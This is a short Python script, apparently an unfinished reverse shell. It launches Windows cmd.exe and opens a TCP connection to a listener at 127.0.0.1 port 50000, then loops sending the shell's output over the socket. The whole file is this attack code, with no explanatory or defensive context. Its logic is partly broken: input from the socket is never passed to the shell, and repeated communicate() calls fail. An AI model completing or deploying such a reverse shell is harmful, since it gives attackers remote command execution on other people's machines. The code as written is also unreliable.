import socket
import subprocess

HOST = '127.0.0.1'
PORT = 50000

p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
#print(p.communicate())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while (1):
	s.send(p.communicate()[0])